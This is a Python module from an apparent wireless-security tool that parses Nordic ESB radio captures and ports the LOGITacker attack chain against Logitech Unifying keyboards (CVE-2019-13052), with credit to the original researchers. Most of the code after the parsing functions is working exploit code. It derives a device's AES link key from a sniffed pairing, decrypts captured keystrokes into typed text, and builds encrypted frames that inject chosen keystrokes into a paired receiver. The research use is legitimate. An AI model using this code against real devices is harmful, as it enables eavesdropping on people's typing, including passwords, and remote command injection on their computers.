"""cli_esb - host-side parsing of captures from the `esb` standalone mode.

Pure functions, no device access. Frames are raw ESB payloads (the radio's own
16-bit CRC already stripped); nothing about the higher-layer protocol is
assumed beyond what's documented for Logitech Unifying specifically. Anything
not understood is reported as-is (raw hex) rather than guessed.

Credits: the Logitech Unifying analysis here (pairing key derivation, keyboard
decryption, HID keymap) is ported from LOGITacker by Marcus Mengs (mame82), who
did the original Unifying vulnerability research (CVE-2019-13052 and related).
The ESB promiscuous capture and the 5/10/22-byte frame analysis build on
Bastille Research's MouseJack (Marc Newlin) and the earlier KeyKeriki work.
"""

import struct

# Logitech Unifying payload shapes, from Bastille Research's MouseJack
# disclosure: the ESB payload is 5, 10 or 22 bytes, with a 1-byte vendor
# checksum as its last byte (the 2-byte ESB CRC is separate, after it). These
# are the lengths LOGITacker's own code keys on (classify_frame == 22/10,
# encrypted keyboard == 22), i.e. the payload length esb_crc_candidates
# reports. What each shape carries (HID++ short/long, encrypted keyboard, etc.)
# is protocol detail; this only reports shape, checksum validity and raw bytes.
UNIFYING_LENS = {5: "short(5)", 10: "short(10)", 22: "long(22)"}

# Printed by commands that surface the Unifying analysis, so the attribution is
# visible at the point of use. See README "Logitech Unifying / ESB research".
UNIFYING_CREDIT = ("Unifying/ESB analysis ported from LOGITacker by Marcus Mengs "
                   "(mame82), original Unifying researcher (CVE-2019-13052).")


def parse_records(blob: bytes):
    """Split the firmware log into (channel, frame) tuples. Stops at a truncated record."""
    out, i = [], 0
    while i + 2 <= len(blob):
        ch, ln = blob[i], blob[i + 1]
        if i + 2 + ln > len(blob):
            break
        out.append((ch, bytes(blob[i + 2:i + 2 + ln])))
        i += 2 + ln
    return out


def unifying_checksum_ok(f: bytes) -> bool:
    """Logitech Unifying's documented vendor checksum: the last byte is the
    negated byte-sum of the rest (so the whole frame sums to 0 mod 256).
    Mirrors mame82's logiteacker_unifying_payload_validate_checksum, including
    its tolerance of a wrong low bit (last == chk or chk & 0xfe). Documented in
    the Bastille/MouseJack and Logitacker write-ups; not Nordic/ESB's own CRC,
    which the radio has already checked and stripped before this."""
    if not f:
        return False
    chk = (-sum(f[:-1])) & 0xFF
    return f[-1] == chk or f[-1] == (chk & 0xFE)


def describe_frame(ch: int, f: bytes) -> str:
    shape = UNIFYING_LENS.get(len(f), f"len={len(f)}")
    ok = "ok" if unifying_checksum_ok(f) else "BAD"
    return f"ch={ch:3d} {shape:<10s} checksum={ok}  {f.hex()}"


def summarize(recs) -> str:
    if not recs:
        return "no frames"
    by_shape = {}
    for _ch, f in recs:
        shape = UNIFYING_LENS.get(len(f), f"len={len(f)}")
        by_shape[shape] = by_shape.get(shape, 0) + 1
    parts = ", ".join(f"{n} {s}" for s, n in sorted(by_shape.items()))
    return f"{len(recs)} frame(s): {parts}"


# --- esb-promisc: brute-force partial-address captures -------------------
#
# Every record here is a CANDIDATE, not a confirmed frame -- the firmware
# runs with CRC off (there's nothing to validate an unknown address
# against), so isolated hits on noise are expected. See
# esb_promisc_radio.h/mode_esb_promisc.c for exactly what's grounded
# (the BALEN-shrink partial-match technique, confirmed on this RADIO
# family for BLE) vs. unverified (that it ports to ESB/Unifying, and the
# exact byte order of the leaked remainder). This module does NOT attempt
# address reconstruction -- that needs a real capture to pin the byte
# order down first; it only groups and dumps candidates so that can be
# done by hand against a capture with a partially-known address.

def parse_promisc_records(blob: bytes):
    """Split the firmware log into (channel, prefix_guess, base_guess, raw) tuples."""
    out, i = [], 0
    while i + 4 <= len(blob):
        ch, prefix, base, ln = blob[i], blob[i + 1], blob[i + 2], blob[i + 3]
        if i + 4 + ln > len(blob):
            break
        out.append((ch, prefix, base, bytes(blob[i + 4:i + 4 + ln])))
        i += 4 + ln
    return out


def describe_promisc_hit(ch: int, prefix: int, base: int, raw: bytes) -> str:
    line = f"ch={ch:3d} prefix={prefix:#04x} base={base:#04x}  {raw.hex()}"
    c = esb_crc_best(prefix, base, raw)
    if c is None:
        return line + "  crc:noise"
    dev = f"{c['device']:#04x}" if c['device'] is not None else "-"
    tag = (f"CRC-OK({c['bitorder']}) addr={c['address'].hex().upper()} "
           f"dev={dev} {esb_classify(c['payload'])} pl={c['payload_len']} pay={c['payload'].hex()}")
    if c['unifying']:
        tag += f" unifying {UNIFYING_LENS[c['payload_len']]} cksum={'ok' if c['cksum_ok'] else 'BAD'}"
    else:
        tag += " unverified(CRC-only)"   # right CRC but not a Unifying shape: likely a noise match
    return line + "  " + tag


# RF/DJ report-type byte (payload[1]) -> name. From Logitech's Unifying DJ
# collection spec (the RF Report Type field) plus the Linux hid-logitech-dj
# driver and lekensteyn/ltunify for the notification range. Bytes not listed
# (incl. the RF-link keepalive/pairing/encrypted-keystroke types, which aren't
# pinned by a public name=value) are shown raw rather than guessed.
_RF_REPORT_TYPES = {
    0x01: "keyboard", 0x02: "mouse", 0x03: "consumer-ctl", 0x04: "system-ctl",
    0x08: "media-center", 0x0E: "kbd-leds", 0x10: "hidpp-short", 0x11: "hidpp-long",
    0x40: "notif-unpaired", 0x41: "notif-paired", 0x42: "notif-conn-status",
    0x4A: "notif-lock-changed", 0x4B: "notif-pair-accepted?", 0x7F: "notif-error",
}


def esb_classify(payload: bytes) -> str:
    """Best-effort Unifying RF frame label. Names are the documented RF/DJ
    report types keyed on payload[1]; a 22-byte payload is the encrypted-
    keyboard shape (Bastille). Unknown type bytes are shown raw."""
    if len(payload) < 2:
        return "short"
    rt = payload[1]
    name = _RF_REPORT_TYPES.get(rt, f"type=0x{rt:02x}")
    if len(payload) == 22:
        name += " [encrypted-kbd shape]"
    return name


def promisc_addresses(recs):
    """Distinct RF addresses recovered from the CRC-valid hits, each with its
    seen device indices, hit count, and whether any hit was Unifying-shaped or
    checksum-verified. An address that is checksum-verified or seen more than
    once is trustworthy; a lone bare-CRC address may be a noise match."""
    found = {}
    for ch, p, b, raw in recs:
        c = esb_crc_best(p, b, raw)
        if c is None:
            continue
        a = c['address'].hex().upper()
        e = found.setdefault(a, {'count': 0, 'devices': set(), 'unifying': False, 'cksum': False})
        e['count'] += 1
        if c['device'] is not None:
            e['devices'].add(c['device'])
        e['unifying'] = e['unifying'] or c['unifying']
        e['cksum'] = e['cksum'] or c['cksum_ok']
    return found


def promisc_hit_counts(recs):
    """(prefix, base) -> hit count. A guess with many hits is a real
    candidate; a guess with one or two is likely noise (CRC is off)."""
    counts = {}
    for _ch, prefix, base, _raw in recs:
        counts[(prefix, base)] = counts.get((prefix, base), 0) + 1
    return counts


def summarize_promisc(recs) -> str:
    if not recs:
        return "no hits"
    counts = promisc_hit_counts(recs)
    top = sorted(counts.items(), key=lambda kv: kv[1], reverse=True)[:5]
    top_str = ", ".join(f"prefix={p:#04x}/base={b:#04x}:{n}" for (p, b), n in top)
    valid = unif = ck = 0
    for ch, p, b, raw in recs:
        c = esb_crc_best(p, b, raw)
        if not c:
            continue
        valid += 1
        unif += c['unifying']
        ck += c['cksum_ok']
    head = f"{len(recs)} hit(s) across {len(counts)} guess(es)"
    if not valid:
        return f"{head}; 0 passed CRC; top: {top_str}"
    # A 16-bit CRC over this many preamble syncs hits on noise now and then, so
    # bare CRC is not proof. Trust a checksum-verified or repeated address.
    addrs = promisc_addresses(recs)
    trusted = {a: d for a, d in addrs.items() if d['cksum'] or d['count'] > 1}
    msg = (f"{head}; {valid} passed CRC ({unif} Unifying-shaped, {ck} checksum-verified)")
    if trusted:
        ts = "; ".join(
            f"{a} (x{d['count']}{', cksum ok' if d['cksum'] else ''})"
            for a, d in sorted(trusted.items(), key=lambda kv: (kv[1]['cksum'], kv[1]['count']), reverse=True))
        return msg + f". Likely real: {ts}. Feed one to: standalone config esb --address <addr>"
    return msg + ". None checksum-verified or repeated -- treat as candidates, not confirmed frames."


# --- ESB CRC-16 validation of promisc captures ---------------------------
#
# A promisc hit is raw bits with CRC off (see esb_promisc_radio.h), so real
# frames and noise matches look alike. nRF24/Nordic ESB appends a 2-byte
# CRC-16/CCITT-FALSE (poly 0x1021, init 0xFFFF) computed MSB-first over the
# contiguous on-air bitstream {address, 9-bit PCF, payload}. Preamble-sync
# captures begin at that address, so sliding the CRC boundary over the raw bits
# and checking for a match tells a real frame from noise -- a false match is
# ~1/65536 per boundary -- and the leading addr_bytes of the matching bitstream
# are the real RF address. The nRF52 stores bits LSBit-first, so the 'lsb'
# (bit-reversed) pass is the one that validates on real hardware.

def _bits_msb(data: bytes):
    out = []
    for byte in data:
        for i in range(7, -1, -1):
            out.append((byte >> i) & 1)
    return out


def _crc16_ccitt(bits) -> int:
    crc = 0xFFFF
    for b in bits:
        crc ^= (b & 1) << 15
        crc = ((crc << 1) ^ 0x1021) & 0xFFFF if (crc & 0x8000) else (crc << 1) & 0xFFFF
    return crc


def _bits_to_int(bits) -> int:
    v = 0
    for b in bits:
        v = (v << 1) | b
    return v


def _rev_byte(x: int) -> int:
    return int(f"{x & 0xFF:08b}"[::-1], 2)


def esb_crc_candidates(prefix: int, base: int, raw: bytes, addr_bytes: int = 5,
                       max_payload: int = 23):
    """CRC-valid ESB framings in one promisc hit. The preamble-sync capture
    begins at the real address, so the bytes are validated as-is -- nothing is
    prepended. Fixes the address at addr_bytes (5 for Unifying); a 3/4-byte-
    address frame still validates, just read as a longer payload. The nRF52
    RADIO stores payload bits LSBit-first, the reverse of the nRF24 on-air
    order the CRC is computed over, so the bytes are tried as captured (msb)
    and bit-reversed (lsb). For each, slides the 2-byte CRC boundary over
    payload lengths and keeps the ones where CRC-16 over the leading bits
    equals the next 16. Shortest payload first; the 'bitorder' tag pins the
    real layout once a frame validates. (prefix/base are the preamble marker,
    not address bytes, so they are not used in the reconstruction.)"""
    out = []
    hdr = addr_bytes * 8 + 9          # address + 9-bit PCF, before payload
    raw = bytes(raw)
    raw_rev = bytes(_rev_byte(x) for x in raw)
    for bitorder, body in (("msb", raw), ("lsb", raw_rev)):
        bits = _bits_msb(body)
        n = len(bits)
        for plen in range(0, max_payload + 1):
            k = hdr + 8 * plen
            if k + 16 > n:
                break
            if _crc16_ccitt(bits[:k]) == _bits_to_int(bits[k:k + 16]):
                address = bytes(_bits_to_int(bits[8 * i:8 * i + 8]) for i in range(addr_bytes))
                payload = bytes(_bits_to_int(bits[hdr + 8 * i:hdr + 8 * i + 8]) for i in range(plen))
                out.append({
                    'order': "none",
                    'bitorder': bitorder,
                    'address': address,            # 5-byte RF address, reconstructed in the matching bit order
                    'device': payload[0] if payload else None,   # Unifying device index (HID++ byte 0)
                    'payload_len': plen,
                    'payload': payload,
                    'crc': _bits_to_int(bits[k:k + 16]),
                    'unifying': plen in UNIFYING_LENS,
                    'cksum_ok': plen in UNIFYING_LENS and unifying_checksum_ok(payload),
                })
    out.sort(key=lambda c: (c['payload_len'], c['bitorder'] != "msb"))
    return out


def esb_crc_best(prefix: int, base: int, raw: bytes):
    """Best CRC-valid framing for a hit, or None. Prefers a Unifying-shaped
    payload whose vendor checksum also passes, else the shortest valid one."""
    cands = esb_crc_candidates(prefix, base, raw)
    if not cands:
        return None
    for c in cands:
        if c['cksum_ok']:
            return c
    for c in cands:
        if c['unifying']:
            return c
    return cands[0]


# --- Unifying pairing capture -> AES link-key derivation (CVE-2019-13052) ---
#
# Ported from LOGITacker by Marcus Mengs (mame82), logitacker_pairing_parser.c
# (via RoganDawes/LOGITacker). Original research and CVE-2019-13052: mame82.
# A Unifying pairing is a cleartext RF handshake; capturing it recovers the
# per-device AES-128 link key, which then decrypts keyboard traffic. Frames
# here are ESB payloads (byte 0 = device index, byte 1 = report type), the same
# payloads esb_crc_candidates yields. The device uses the global pairing
# address BB:0A:DC:A5:75 during the exchange.
UNIFYING_GLOBAL_PAIRING_ADDRESS = bytes([0xBB, 0x0A, 0xDC, 0xA5, 0x75])


def classify_pairing_frame(payload: bytes):
    """Pairing phase of one ESB payload, or None. Length + report-type (byte 1)
    + phase (byte 2), exactly as LOGITacker's classify_frame."""
    n = len(payload)
    if n == 22 and payload[1] in (0x5f, 0xdf):                 # device -> dongle request
        return {0x01: "req1", 0x02: "req2", 0x03: "req3"}.get(payload[2])
    if n == 22 and payload[1] == 0x1f:                         # dongle -> device response
        return {0x01: "rsp1", 0x02: "rsp2"}.get(payload[2])
    if n == 10 and payload[1] == 0x0f:
        return "rsp_final"
    return None


class UnifyingPairing:
    """Accumulates pairing frames and derives the AES link key. Feed each
    captured ESB payload to ingest(); once req1/req2/rsp1/rsp2 are in,
    key_material_complete() is true and device_key() returns the 16-byte key."""

    def __init__(self):
        self.f = {}
        self.seen = set()

    def ingest(self, payload: bytes):
        payload = bytes(payload)
        cls = classify_pairing_frame(payload)
        if cls == "req1":                                      # device WPID, type, caps
            self.f["device_wpid"] = payload[9:11]
            self.f["device_type"] = payload[13]
            self.f["device_caps"] = payload[14]
        elif cls == "req2":                                    # device nonce, serial
            self.f["device_nonce"] = payload[3:7]
            self.f["device_serial"] = payload[7:11]
        elif cls == "req3":                                    # device name
            nl = min(payload[4], 16)
            self.f["device_name"] = payload[5:5 + nl]
        elif cls == "rsp1":                                    # dongle WPID, assigned RF address
            self.f["dongle_wpid"] = payload[9:11]
            self.f["device_rf_address"] = payload[3:8]
        elif cls == "rsp2":                                    # dongle nonce
            self.f["dongle_nonce"] = payload[3:7]
        elif cls != "rsp_final":
            return None
        self.seen.add(cls)
        return cls

    def key_material_complete(self) -> bool:
        return {"req1", "req2", "rsp1", "rsp2"} <= self.seen

    def raw_key_material(self) -> bytes:
        f = self.f
        return (bytes(f["device_rf_address"][:4]) + bytes(f["device_wpid"]) +
                bytes(f["dongle_wpid"]) + bytes(f["device_nonce"]) + bytes(f["dongle_nonce"]))

    def device_key(self) -> bytes:
        r = self.raw_key_material()
        k = bytearray(16)
        k[2] = r[0]
        k[1] = r[1] ^ 0xFF
        k[5] = r[2] ^ 0xFF
        k[3] = r[3]
        k[14] = r[4]
        k[11] = r[5]
        k[9] = r[6]
        k[0] = r[7]
        k[8] = r[8]
        k[6] = r[9] ^ 0x55
        k[4] = r[10]
        k[15] = r[11]
        k[10] = r[12] ^ 0xFF
        k[12] = r[13]
        k[7] = r[14]
        k[13] = r[15] ^ 0x55
        return bytes(k)


def _pair_checksum(buf: bytearray) -> None:
    """Set the last byte so the whole frame sums to 0 mod 256 (vendor checksum)."""
    buf[-1] = (-sum(buf[:-1])) & 0xFF


def unifying_build_pairing(device_rf_address: bytes, device_wpid: bytes, dongle_wpid: bytes,
                           device_nonce: bytes, dongle_nonce: bytes, device_name: str = "CU-TEST",
                           device_type: int = 0x01, device_caps: int = 0x00,
                           device_serial: bytes = b"\x11\x22\x33\x44"):
    """Build a Unifying pairing handshake (req1/req2/req3/rsp1/rsp2/rsp_final) as
    ESB payloads carrying the given key material, with valid vendor checksums.
    The inverse of the classify/ingest parser: feeding the result back through
    unifying_pairing_key() returns the key these fields derive. For the two-CU
    rig -- transmit these, capture with esb-promisc, recover with --pairing."""
    name = device_name.encode("latin1", "replace")[:16]

    req1 = bytearray(22); req1[1] = 0x5f; req1[2] = 0x01
    req1[9:11] = device_wpid; req1[13] = device_type & 0xFF; req1[14] = device_caps & 0xFF
    _pair_checksum(req1)

    req2 = bytearray(22); req2[1] = 0x5f; req2[2] = 0x02
    req2[3:7] = device_nonce; req2[7:11] = device_serial
    _pair_checksum(req2)

    req3 = bytearray(22); req3[1] = 0x5f; req3[2] = 0x03
    req3[4] = len(name); req3[5:5 + len(name)] = name
    _pair_checksum(req3)

    rsp1 = bytearray(22); rsp1[1] = 0x1f; rsp1[2] = 0x01
    rsp1[3:8] = device_rf_address[:5]; rsp1[9:11] = dongle_wpid
    _pair_checksum(rsp1)

    rsp2 = bytearray(22); rsp2[1] = 0x1f; rsp2[2] = 0x02
    rsp2[3:7] = dongle_nonce
    _pair_checksum(rsp2)

    rsp_final = bytearray(10); rsp_final[1] = 0x0f
    _pair_checksum(rsp_final)

    return [bytes(x) for x in (req1, req2, req3, rsp1, rsp2, rsp_final)]


def unifying_pairing_key(payloads):
    """Parse a captured pairing (iterable of ESB payloads) and return the
    recovered key, or None if the key-material frames weren't all captured."""
    p = UnifyingPairing()
    for pl in payloads:
        p.ingest(pl)
    if not p.key_material_complete():
        return None
    name = p.f.get("device_name", b"")
    return {
        "address": p.f["device_rf_address"],
        "raw_key_material": p.raw_key_material(),
        "device_key": p.device_key(),
        "device_wpid": p.f["device_wpid"],
        "dongle_wpid": p.f["dongle_wpid"],
        "device_name": name.decode("latin1", "replace") if name else "",
        "full_pairing": {"req1", "req2", "req3", "rsp1", "rsp2", "rsp_final"} <= p.seen,
    }


# --- Unifying encrypted-keyboard decryption (step after key recovery) -------
#
# Ported from LOGITacker by Marcus Mengs (mame82), logitacker_unifying_crypto.c.
# An encrypted keyboard
# RF frame is 22 bytes with (data[1] & 0x1f) == 0x13. The per-frame key is
# AES-128-ECB(device_key, secret) where `secret` is a fixed 16-byte block with
# the frame's 4-byte counter spliced in at offset 7; the 8 ciphertext bytes
# (data[2..9]) are XORed with the first 8 key bytes to recover the HID report.
#
# AES-128 here is a compact, self-contained block-encrypt (no third-party dep).
# It is for OFFLINE analysis of captured frames only -- not constant-time, not
# for live/production crypto. Verified against the FIPS-197 known-answer test.

_LITTLE_KNOWN_SECRET = bytes([0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d,
                              0xde, 0xad, 0xbe, 0xef,          # overwritten by counter[0:4]
                              0x0a, 0x0d, 0x13, 0x26, 0x0e])


def _gf_mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1:
            r ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1b
        b >>= 1
    return r


def _build_aes_sbox():
    inv = [0] * 256
    for a in range(1, 256):
        for b in range(1, 256):
            if _gf_mul(a, b) == 1:
                inv[a] = b
                break
    sbox = [0] * 256
    for a in range(256):
        x = inv[a]
        s = x
        for _ in range(4):
            x = ((x << 1) | (x >> 7)) & 0xFF
            s ^= x
        sbox[a] = s ^ 0x63
    return sbox


_AES_SBOX = _build_aes_sbox()
_AES_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]


def _aes128_key_schedule(key: bytes):
    w = [list(key[i:i + 4]) for i in range(0, 16, 4)]   # 4 words
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = t[1:] + t[:1]                            # RotWord
            t = [_AES_SBOX[b] for b in t]               # SubWord
            t[0] ^= _AES_RCON[i // 4 - 1]
        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
    return [sum((w[r * 4 + c] for c in range(4)), []) for r in range(11)]  # 11 round keys, 16B each


def _aes128_encrypt_block(key: bytes, block: bytes) -> bytes:
    rk = _aes128_key_schedule(key)
    s = [block[i] ^ rk[0][i] for i in range(16)]
    for rnd in range(1, 11):
        s = [_AES_SBOX[b] for b in s]                   # SubBytes
        # ShiftRows (state is column-major: byte index = col*4 + row)
        s = [s[(i + (i % 4) * 4) % 16] for i in range(16)]
        if rnd != 10:                                   # MixColumns
            ns = [0] * 16
            for c in range(4):
                col = s[c * 4:c * 4 + 4]
                ns[c * 4 + 0] = _gf_mul(col[0], 2) ^ _gf_mul(col[1], 3) ^ col[2] ^ col[3]
                ns[c * 4 + 1] = col[0] ^ _gf_mul(col[1], 2) ^ _gf_mul(col[2], 3) ^ col[3]
                ns[c * 4 + 2] = col[0] ^ col[1] ^ _gf_mul(col[2], 2) ^ _gf_mul(col[3], 3)
                ns[c * 4 + 3] = _gf_mul(col[0], 3) ^ col[1] ^ col[2] ^ _gf_mul(col[3], 2)
            s = ns
        s = [s[i] ^ rk[rnd][i] for i in range(16)]      # AddRoundKey
    return bytes(s)


def unifying_frame_key(device_key: bytes, counter: bytes) -> bytes:
    """Per-frame AES key = AES-ECB(device_key, secret) with the 4-byte counter
    spliced into the fixed secret at offset 7."""
    secret = bytearray(_LITTLE_KNOWN_SECRET)
    secret[7:11] = bytes(counter[:4])
    return _aes128_encrypt_block(bytes(device_key), bytes(secret))


def esb_decrypt_keyboard_frame(device_key: bytes, payload: bytes):
    """Decrypt a 22-byte encrypted-keyboard ESB payload with the recovered
    device key. Returns the 8-byte HID keyboard report, or None if `payload`
    isn't an encrypted keyboard frame."""
    if len(payload) != 22 or (payload[1] & 0x1f) != 0x13:
        return None
    counter = bytes(payload[10:14])
    fk = unifying_frame_key(device_key, counter)
    return bytes(payload[2 + i] ^ fk[i] for i in range(8))


# --- HID keyboard report -> text (US layout) --------------------------------
#
# USB HID usage IDs (HID Usage Tables, keyboard page, table 12), as enumerated
# in LOGITacker's logitacker_keyboard_map.h (Marcus Mengs, mame82). US (ANSI)
# base; DK (ISO) is layered on top via _HID_DK_OVERRIDES below.
# A decrypted keyboard report is 8 bytes: [modifiers][reserved][keycode x6].

def _build_hid_us():
    m = {}
    for i in range(26):                       # 0x04..0x1d  a-z
        m[0x04 + i] = (chr(ord('a') + i), chr(ord('A') + i))
    digits = "1234567890"
    shifted = "!@#$%^&*()"
    for i in range(10):                       # 0x1e..0x27  1-0
        m[0x1e + i] = (digits[i], shifted[i])
    m.update({
        0x2d: ("-", "_"), 0x2e: ("=", "+"), 0x2f: ("[", "{"), 0x30: ("]", "}"),
        0x31: ("\\", "|"), 0x32: ("#", "~"), 0x33: (";", ":"), 0x34: ("'", '"'),
        0x35: ("`", "~"), 0x36: (",", "<"), 0x37: (".", ">"), 0x38: ("/", "?"),
        0x64: ("<", ">"),                     # ISO 102nd key
        0x28: ("\n", "\n"), 0x2b: ("\t", "\t"), 0x2c: (" ", " "),
        0x54: ("/", "/"), 0x55: ("*", "*"), 0x56: ("-", "-"), 0x57: ("+", "+"),
        0x58: ("\n", "\n"), 0x63: (".", "."),
    })
    for i in range(10):                       # keypad 1-9,0  0x59..0x62
        m[0x59 + i] = (str((i + 1) % 10), str((i + 1) % 10))
    named = {
        0x29: "esc", 0x2a: "bs", 0x39: "caps", 0x46: "prtsc", 0x47: "scroll",
        0x48: "pause", 0x49: "ins", 0x4a: "home", 0x4b: "pgup", 0x4c: "del",
        0x4d: "end", 0x4e: "pgdn", 0x4f: "right", 0x50: "left", 0x51: "down",
        0x52: "up", 0x53: "num", 0x65: "menu",
    }
    for i in range(12):
        named[0x3a + i] = f"f{i + 1}"
    for k, v in named.items():
        m[k] = f"<{v}>"
    return m


_HID_US = _build_hid_us()

# Danish (ISO) overrides on top of US, keyed by the same usage IDs. From the
# X11/xkb `dk` map and the CLDR Danish key set: the digit-row shifts, the
# aring/ae/oslash keys, and the 102nd key. AltGr (right-alt) levels -- @ { [ ] }
# | etc. -- are not mapped; a right-alt'd key renders as <alt+...>.
_HID_DK_OVERRIDES = {
    0x1f: ("2", '"'), 0x20: ("3", "#"), 0x21: ("4", "¤"), 0x23: ("6", "&"),
    0x24: ("7", "/"), 0x25: ("8", "("), 0x26: ("9", ")"), 0x27: ("0", "="),
    0x2d: ("+", "?"), 0x2e: ("´", "`"),
    0x2f: ("å", "Å"), 0x30: ("¨", "^"),            # a-ring, diaeresis/circumflex
    0x33: ("æ", "Æ"), 0x34: ("ø", "Ø"),        # ae, o-slash
    0x35: ("½", "§"), 0x31: ("'", "*"),
    0x36: (",", ";"), 0x37: (".", ":"), 0x38: ("-", "_"),
    0x64: ("<", ">"),
}
_HID_LAYOUTS = {"us": _HID_US, "dk": {**_HID_US, **_HID_DK_OVERRIDES}}

# modifier bits (HID): L/R Ctrl 0x01/0x10, Shift 0x02/0x20, Alt 0x04/0x40, Gui 0x08/0x80
_MOD_SHIFT = 0x22
_MOD_CTRL = 0x11
_MOD_ALT = 0x44
_MOD_GUI = 0x88


def _render_key(code: int, mod: int, layout: str = "us") -> str:
    v = _HID_LAYOUTS.get(layout, _HID_US).get(code)
    if v is None:
        return f"<0x{code:02x}>"
    if not isinstance(v, tuple):
        return v                              # named key (e.g. <esc>), shift N/A
    ch = v[1] if (mod & _MOD_SHIFT) else v[0]
    combo = ("ctrl+" if (mod & _MOD_CTRL) else "") + \
            ("alt+" if (mod & _MOD_ALT) else "") + \
            ("gui+" if (mod & _MOD_GUI) else "")
    if combo:
        label = {"\n": "enter", "\t": "tab", " ": "space"}.get(ch, ch)
        return f"<{combo}{label}>"
    return ch


def hid_report_to_keys(report: bytes, prev_keys=None, layout: str = "us"):
    """Keys newly pressed in this 8-byte HID report versus prev_keys (the raw
    keycode set from the previous report), as rendered text. Returns
    (text, current_keys). A held key repeats across reports, so only the
    down-transition is emitted -- that reconstructs what was actually typed."""
    prev = prev_keys or set()
    mod = report[0]
    keys = [k for k in report[2:7] if k > 0x03]   # [7] is Logitech's 0xC9 sentinel, not a key
    cur = set(keys)
    text = "".join(_render_key(k, mod, layout) for k in keys if k not in prev)
    return text, cur


def esb_type_from_frames(device_key: bytes, payloads, layout: str = "us"):
    """Decrypt a sequence of encrypted-keyboard ESB payloads and reconstruct
    the typed text (down-transitions only). Non-keyboard frames are skipped.
    layout selects the HID keymap ('us' or 'dk')."""
    out, prev = [], set()
    for pl in payloads:
        rep = esb_decrypt_keyboard_frame(device_key, bytes(pl))
        if rep is None:
            continue
        text, prev = hid_report_to_keys(rep, prev, layout)
        out.append(text)
    return "".join(out)


# --- text -> HID reports -> encrypted keyboard frames (injection / TX side) --
#
# The inverse of the decrypt chain above. Mirrors mame82's
# logitacker_unifying_crypto_encrypt_keyboard_frame (Unifying workmode):
# 22-byte frame, data[1]=0xD3, big-endian counter at [10:14], plaintext report
# at [2:10] with data[9] forced to the 0xC9 sentinel, XOR of frame_key[0:8],
# then the Logitech checksum as the last byte. LIGHTSPEED (G-series) workmode is
# not built here. Encrypted keyboards carry 5 simultaneous keys (report[2:7]).

def _reverse_layout(layout: str = "us"):
    """char -> (keycode, needs_shift) for the given layout. Lower keycodes win,
    so the main rows beat the keypad duplicates of '/','-','+','.' etc."""
    rev = {}
    for code in sorted(_HID_LAYOUTS.get(layout, _HID_US)):
        v = _HID_LAYOUTS[layout][code]
        if not isinstance(v, tuple):
            continue
        base, shifted = v
        rev.setdefault(base, (code, False))
        rev.setdefault(shifted, (code, True))
    return rev


def text_to_hid_reports(text: str, layout: str = "us"):
    """Turn text into [keydown, keyup] 8-byte HID report pairs, one char at a
    time. Returns (reports, skipped) where skipped lists characters with no key
    in this layout (e.g. AltGr-only glyphs). report[7] is the 0xC9 sentinel."""
    rev = _reverse_layout(layout)
    reports, skipped = [], []
    for ch in text:
        hit = rev.get(ch)
        if hit is None:
            skipped.append(ch)
            continue
        code, shift = hit
        rep = bytearray(8)
        rep[0] = 0x02 if shift else 0x00          # left shift
        rep[2] = code
        rep[7] = 0xC9                             # Logitech sentinel
        reports.append(bytes(rep))
        reports.append(bytes([0, 0, 0, 0, 0, 0, 0, 0xC9]))   # key release
    return reports, skipped


def esb_encrypt_keyboard_frame(device_key: bytes, report: bytes, counter: int) -> bytes:
    """Build one 22-byte encrypted keyboard frame from an 8-byte HID report and
    a 32-bit counter (Unifying workmode: big-endian counter bytes)."""
    f = bytearray(22)
    f[1] = 0xD3
    cb = counter.to_bytes(4, "big")
    f[10:14] = cb
    fk = unifying_frame_key(device_key, cb)
    f[2:10] = bytes(report[:8])
    f[9] = 0xC9                                   # sentinel, overwrites report[7] pre-XOR
    for i in range(8):
        f[2 + i] ^= fk[i]
    f[21] = (-sum(f[:21])) & 0xFF                 # Logitech checksum: whole frame sums to 0
    return bytes(f)


def esb_build_keyboard_frames(device_key: bytes, text: str, layout: str = "us",
                              start_counter: int = 0, device_index: int = 0):
    """Build the encrypted keyboard frames that type `text` on a receiver paired
    with `device_key`. Returns (frames, skipped): frames is the list of 22-byte
    payloads (counter incrementing from start_counter), skipped the characters
    with no key in `layout`. The caller transmits them in order on the device's
    address; the firmware owns counter sync and frame timing."""
    reports, skipped = text_to_hid_reports(text, layout)
    frames, ctr = [], start_counter
    for rep in reports:
        f = bytearray(esb_encrypt_keyboard_frame(device_key, rep, ctr))
        f[0] = device_index & 0xFF
        f[21] = (-sum(f[:21])) & 0xFF             # checksum after device index set
        frames.append(bytes(f))
        ctr += 1
    return frames, skipped
